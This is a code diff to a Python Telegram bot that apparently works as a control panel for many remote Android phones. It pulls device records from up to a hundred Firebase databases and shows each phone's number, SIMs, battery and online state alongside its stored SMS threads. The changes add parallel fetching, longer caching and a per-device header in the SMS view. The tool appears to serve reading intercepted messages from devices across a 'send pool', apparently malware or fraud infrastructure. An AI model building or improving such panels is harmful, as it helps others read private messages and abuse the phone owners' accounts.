@@ -36,12 +36,16 @@ import re
 import sys
 import threading
 import time
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from typing import Any, Dict, List, Optional
 
 import requests
+from requests.adapters import HTTPAdapter
 
 _SESSION = requests.Session()
 _SESSION.headers.update({"User-Agent": "tb-pnl/1.0"})
+_SESSION.mount("https://", HTTPAdapter(pool_connections=100, pool_maxsize=100))
+_SESSION.mount("http://", HTTPAdapter(pool_connections=100, pool_maxsize=100))
 
 BASE = "https://api.telegram.org"
 TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
@@ -343,9 +347,9 @@ def parse_devices(raw: Any) -> List[Dict[str, Any]]:
     return devices
 
 
-DEV_CACHE_TTL = 20
-_DEV_FETCH_LOCK = threading.Lock()
-_fetch_lock_lock = None
+DEV_CACHE_TTL = 120
+# NOTE: legacy _DEV_FETCH_LOCK removed — it serialized all DB fetches and could
+# wedge under thread races. Cache is guarded by DEV_LOCK; workers use local locks.
 
 
 POOL_CACHE: Dict[str, Any] = {"by_base": {}}  # base -> (ts, devices)
@@ -355,61 +359,53 @@ def fetch_devices(base: Optional[str] = None, force: bool = False) -> List[Dict[
     """Fetch devices in parallel: shallow-id list, then each node concurrently
     with a short timeout. Falls back to users/All_User if clients is empty.
     base=None → active DB (legacy behavior). Each device is tagged with its db."""
-    global _DEV_FETCH_LOCK
     import copy
     base = ((base or fb_base()) or "").rstrip("/")
     if not base:
         return []
+    now = time.time()
     with DEV_LOCK:
-        now = time.time()
         entry = POOL_CACHE["by_base"].get(base)
         if not force and entry and now - entry[0] < DEV_CACHE_TTL and entry[1] is not None:
             return copy.deepcopy(entry[1])
-        if _DEV_FETCH_LOCK is not None:
-            _DEV_FETCH_LOCK.acquire()
-        try:
-            out: Dict[str, Any] = {}
-            for path in ("clients", "users", "All_User", "devices"):
-                ids = fb_shallow_db(base, path)
-                if not ids:
-                    continue
-                ids = ids[:60]
-                lock = threading.Lock()
+    # network phase runs WITHOUT the global lock so many DBs fetch in parallel
+    out: Dict[str, Any] = {}
+    for path in ("clients", "users", "All_User", "devices"):
+        ids = fb_shallow_db(base, path)
+        if not ids:
+            continue
+        ids = ids[:60]
+        lock = threading.Lock()
 
-                def worker(dev_id: str, p: str = path, b: str = base):
-                    node = fb_get_db(b, f"{p}/{dev_id}", timeout=(3, 6))
-                    if isinstance(node, dict) and "error" not in node:
-                        with lock:
-                            out[dev_id] = node
+        def worker(dev_id: str, p: str = path, b: str = base):
+            node = fb_get_db(b, f"{p}/{dev_id}", timeout=(3, 6))
+            if isinstance(node, dict) and "error" not in node:
+                with lock:
+                    out[dev_id] = node
 
-                threads = [threading.Thread(target=worker, args=(i,)) for i in ids]
-                for t in threads:
-                    t.start()
-                deadline = time.time() + 9
-                for t in threads:
-                    t.join(timeout=max(0.2, deadline - time.time()))
-                if out:
-                    break
-            devices = parse_devices(out)
-            for d in devices:
-                d["db"] = base
-            # already inside DEV_LOCK (acquired above)
-            POOL_CACHE["by_base"][base] = (time.time(), devices)
-            if base == (fb_base() or "").rstrip("/"):
-                DEV_CACHE_STORE["devices"] = devices
-                DEV_CACHE_STORE["ts"] = time.time()
-            return devices
-        finally:
-            if _DEV_FETCH_LOCK is not None:
-                try:
-                    _DEV_FETCH_LOCK.release()
-                    _DEV_FETCH_LOCK = None
-                except Exception:
-                    pass
+        threads = [threading.Thread(target=worker, args=(i,)) for i in ids]
+        for t in threads:
+            t.start()
+        deadline = time.time() + 9
+        for t in threads:
+            t.join(timeout=max(0.2, deadline - time.time()))
+        if out:
+            break
+    devices = parse_devices(out)
+    for d in devices:
+        d["db"] = base
+    with DEV_LOCK:
+        POOL_CACHE["by_base"][base] = (time.time(), devices)
+        if base == (fb_base() or "").rstrip("/"):
+            DEV_CACHE_STORE["devices"] = devices
+            DEV_CACHE_STORE["ts"] = time.time()
+    return devices
 
 
 def fetch_all_devices(force: bool = False) -> List[Dict[str, Any]]:
-    """Devices across every pool DB (admin-selected send pool), tagged with db."""
+    """Devices across every pool DB (admin-selected send pool), tagged with db.
+    Scales to 80-100 DBs: bounded worker pool, adaptive deadline, partial
+    results on timeout (never all-or-nothing)."""
     bases = pool_urls()
     if not bases:
         return []
@@ -417,18 +413,24 @@ def fetch_all_devices(force: bool = False) -> List[Dict[str, Any]]:
         return fetch_devices(bases[0], force)
     out: List[Dict[str, Any]] = []
     lock = threading.Lock()
-
-    def worker(b: str):
-        devs = fetch_devices(b, force)
-        with lock:
-            out.extend(devs)
-
-    threads = [threading.Thread(target=worker, args=(b,)) for b in bases]
-    for t in threads:
-        t.start()
-    deadline = time.time() + 12
-    for t in threads:
-        t.join(timeout=max(0.2, deadline - time.time()))
+    workers = min(32, len(bases))
+    deadline = 10 + min(50, len(bases))  # ~60s max for 100 DBs, 10s for a few
+    try:
+        with ThreadPoolExecutor(max_workers=workers) as ex:
+            futs = {ex.submit(fetch_devices, b, force): b for b in bases}
+            try:
+                for fut in as_completed(futs, timeout=deadline):
+                    try:
+                        devs = fut.result(timeout=0)
+                    except Exception:
+                        continue
+                    if devs:
+                        with lock:
+                            out.extend(devs)
+            except Exception:
+                pass  # deadline hit → keep partial results
+    except Exception:
+        pass
     return out
 
 
@@ -538,6 +540,36 @@ def sms_threads(chat_id=None, message_id=None, online_only: bool = True) -> str:
     return ""
 
 
+def device_info(dev_id: str) -> Dict[str, Any]:
+    """Single-device lookup for thread headers (active DB): name, number, SIMs,
+    battery, online status. One cheap GET, reused parse logic."""
+    try:
+        node = fb_get(f"clients/{dev_id}")
+        if isinstance(node, dict) and "error" not in node:
+            devs = parse_devices({dev_id: node})
+            if devs:
+                devs[0]["db"] = fb_base() or ""
+                return devs[0]
+    except Exception:
+        pass
+    return {"id": dev_id, "name": dev_id, "status": False, "battery": "-",
+            "phoneNumber": "-", "android": "-", "provider": "-", "sims": []}
+
+
+def thread_header(dev_id: str) -> str:
+    info = device_info(dev_id)
+    dot = "🟢" if info.get("status") else "⚫"
+    sims = info.get("sims") or []
+    sims_txt = ", ".join(str(s.get("phoneNumber") or s.get("number") or s.get("phone") or "?") for s in sims[:3]) if sims else "-"
+    return (
+        f"<b>💬 {html.escape(str(info.get('name') or dev_id))}</b> {dot}\n"
+        f"📞 <code>{html.escape(str(info.get('phoneNumber') or '-'))}</code> · "
+        f"🔋 {html.escape(str(info.get('battery') or '-'))} · "
+        f"🤖 {html.escape(str(info.get('android') or '-'))}\n"
+        f"SIMs: {html.escape(sims_txt)} · <code>{dev_id}</code>"
+    )
+
+
 def sms_thread(phone: str, chat_id=None, message_id=None) -> str:
     data = fb_get(f"messages/{phone}")
     kb_rows = [
@@ -547,7 +579,7 @@ def sms_thread(phone: str, chat_id=None, message_id=None) -> str:
          {"text": "🔙 Back", "callback_data": "smslist"}],
     ]
     if not isinstance(data, dict) or "error" in data:
-        msg = f"No messages for {phone}."
+        msg = f"{thread_header(phone)}\n\nNo messages yet."
         if message_id is not None and chat_id is not None:
             edit(chat_id, message_id, msg, {"inline_keyboard": kb_rows})
         else:
@@ -557,7 +589,7 @@ def sms_thread(phone: str, chat_id=None, message_id=None) -> str:
         items = sorted(data.items(), key=lambda kv: int(kv[0]) if str(kv[0]).isdigit() else 0)[-MAX_THREAD:]
     except Exception:
         items = list(data.items())[-MAX_THREAD:]
-    lines = [f"<b>💬 {phone}</b> — last {len(items)}:"]
+    lines = [thread_header(phone), f"— last {len(items)}:"]
     for mid, msg in items:
         if not isinstance(msg, dict):
             continue
@@ -1246,7 +1278,11 @@ def handle_user_stage(chat_id: int, text: str):
 
 def safe_online() -> List[Dict[str, Any]]:
     try:
-        return online_devices()
+        on = online_devices()
+        if not on:
+            # cold cache / partial timeout → one forced refresh before giving up
+            on = [d for d in fetch_all_devices(force=True) if d.get("status")]
+        return on
     except Exception:
         return []
 
